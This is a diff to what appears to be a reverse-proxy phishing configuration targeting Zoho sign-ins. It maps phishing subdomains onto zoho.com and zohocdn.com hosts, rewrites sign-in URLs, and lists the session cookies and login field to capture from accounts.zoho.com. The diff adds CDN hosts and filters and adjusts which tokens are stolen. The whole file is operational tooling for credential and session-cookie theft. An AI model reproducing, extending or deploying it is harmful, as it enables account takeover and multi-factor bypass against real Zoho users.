@@ -6,8 +6,9 @@ proxy_hosts:
   - {phish_sub: 'mail', orig_sub: 'mail', domain: 'zoho.com', session: false, is_landing: false, auto_filter: false}
   - {phish_sub: 'us4-wms2', orig_sub: 'us4-wms2', domain: 'zoho.com', session: false, is_landing: false, auto_filter: false}
   - {phish_sub: 'salesiq', orig_sub: 'salesiq', domain: 'zoho.com', session: false, is_landing: false, auto_filter: false}
-  # - {phish_sub: 'static', orig_sub: 'www', domain: 'zoho.com', session: false, is_landing: false, auto_filter: false}
-  # - {phish_sub: 'js', orig_sub: 'www', domain: 'zoho.com', session: false, is_landing: false, auto_filter: false}
+  - {phish_sub: 'static', orig_sub: 'www', domain: 'zoho.com', session: false, is_landing: false, auto_filter: false}
+  - {phish_sub: 'js', orig_sub: 'js', domain: 'zohocdn.com', session: false, is_landing: false, auto_filter: false}
+  - {phish_sub: 'static', orig_sub: 'static', domain: 'zohocdn.com', session: false, is_landing: false, auto_filter: false}
   # - {phish_sub: 'www', orig_sub: 'www', domain: 'zoho.com', session: false, is_landing: false, auto_filter: false}
 
 
@@ -16,7 +17,9 @@ sub_filters:
 
   # - {triggers_on: 'js.zohocdn.com', orig_sub: 'js', domain: 'zohocdn.com', search: 'https://{hostname}/signin', replace: 'https://{hostname}/ichat/js/46520dce_wmsbridge.js', mimes: ['text/html', 'application/json', 'application/javascript']}
 
-  # - {triggers_on: 'static.zohocdn.com', orig_sub: 'static', domain: 'zohocdn.com', search: 'https://{hostname}/signin', replace: 'https://{hostname}/iam/v2/components/tp_pkg/xregexp-all.2a67efb28253461665e6cd92f41b19b0.js', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'static.zohocdn.com', orig_sub: 'static', domain: 'zohocdn.com', search: 'https://{hostname}/signin', replace: 'https://{hostname}/iam/v2/components/', mimes: ['text/html', 'application/json', 'application/javascript']}
+
+  - {triggers_on: 'accounts.zohocdn.com', orig_sub: 'accounts', domain: 'zohocdn.com', search: 'https://{hostname}/signin', replace: 'https://{hostname}/s', mimes: ['text/html', 'application/json', 'application/javascript']}
   
   # - {triggers_on: 'static.zohocdn.com', orig_sub: 'static', domain: 'zohocdn.com', search: 'https://{hostname}/signin', replace: 'https://{hostname}/iam/v2/components/tp_pkg/u2f-api.5efcbd46fc391c7d06fabef02b162563.js', mimes: ['text/html', 'application/json', 'application/javascript']}
  
@@ -85,12 +88,12 @@ sub_filters:
 
 
 auth_tokens:
-  - domain: '.zoho.com'
-    keys: ['.*,regexp']
+  # - domain: '.zoho.com'
+  #   keys: ['.*,regexp']
   - domain: 'accounts.zoho.com'
     keys: ['zps-tgr-dts', 'zpsfa_sixYsSO', 'zohocares-_zldp', 'zohocares-_uuid', 'IAMSATCK_728151783', 'e188bc05fe', 'iamcsr', '_zcsr_tmp', 'JSESSIONID', 'stk', '_iamadt', '_iambdt', '_z_identity', '.*,regexp']
-  - domain: 'mail.zoho.com'
-    keys: ['.*,regexp']    
+  # - domain: 'mail.zoho.com'
+  #   keys: ['.*,regexp']    
 credentials:
   username:
     key: 'loginid'
